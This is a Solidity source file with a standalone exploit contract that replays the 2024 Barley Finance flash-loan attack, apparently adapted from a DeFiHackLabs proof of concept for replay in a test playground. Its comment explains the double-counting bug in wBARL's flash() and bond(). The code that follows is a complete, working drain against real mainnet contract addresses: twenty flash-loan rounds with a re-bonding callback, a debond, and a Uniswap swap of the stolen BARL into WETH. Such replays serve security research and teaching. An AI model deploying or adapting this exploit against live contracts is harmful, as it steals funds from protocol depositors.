// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-01-BarleyFinance).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (ContractTest itself is the flash-loan borrower — its `callback` function is
// the wBARL flash-loan callback), so there is no standalone contract to deploy.
// This contract is a faithful, self-contained copy of that inline attack
// (testExploit's loop + callback + BARLToWETH) so the playground can deploy it
// and record run(). Logic and constants are copied verbatim from
// test/BarleyFinance_exp.sol.
//
// Root cause: wBARL's flash() only checks that its BARL balance is restored
// after the callback. The attacker bonds the flash-loaned BARL back into wBARL
// inside the callback -- bond() mints new wBARL shares for the deposit AND the
// deposit is what restores the flash balance, so the same BARL is counted
// twice. Repeating 20x mints a huge share of wBARL against unchanged real
// backing, letting the attacker debond() and redeem far more BARL than was
// ever deposited, net of the 200 DAI (20 x 10 DAI) flash fee.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IwBARL is IERC20 {
    function flash(address _recipient, address _token, uint256 _amount, bytes memory _data) external;
    function bond(address _token, uint256 _amount) external;
    function debond(uint256 _amount, address[] memory, uint8[] memory) external;
}

interface IUniswapV3Router {
    struct ExactInputParams {
        bytes path;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
    }

    function exactInput(ExactInputParams memory params) external payable returns (uint256 amountOut);
}

contract BarleyDrain {
    IERC20 private constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 private constant BARL = IERC20(0x3e2324342bF5B8A1Dca42915f0489497203d640E);
    IERC20 private constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IwBARL private constant wBARL = IwBARL(0x04c80Bb477890F3021F03B068238836Ee20aA0b8);
    IUniswapV3Router private constant Router = IUniswapV3Router(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    function run() external {
        uint8 i;
        while (i < 20) {
            DAI.approve(address(wBARL), 10e18);
            wBARL.flash(address(this), address(BARL), BARL.balanceOf(address(wBARL)), "");
            ++i;
        }

        address[] memory token = new address[](1);
        token[0] = address(BARL);
        uint8[] memory percentage = new uint8[](1);
        percentage[0] = 100;
        wBARL.debond(wBARL.balanceOf(address(this)), token, percentage);

        BARLToWETH();
    }

    // wBARL flash-loan callback -- the vulnerable re-entry point.
    function callback(bytes calldata) external {
        BARL.approve(address(wBARL), BARL.balanceOf(address(this)));
        wBARL.bond(address(BARL), BARL.balanceOf(address(this)));
    }

    function BARLToWETH() internal {
        BARL.approve(address(Router), type(uint256).max);
        bytes memory _path = abi.encodePacked(address(BARL), hex"002710", address(DAI), hex"0001f4", address(WETH));
        IUniswapV3Router.ExactInputParams memory params = IUniswapV3Router.ExactInputParams({
            path: _path,
            recipient: address(this),
            deadline: block.timestamp + 1000,
            amountIn: BARL.balanceOf(address(this)),
            amountOutMinimum: 0
        });
        Router.exactInput(params);
    }
}
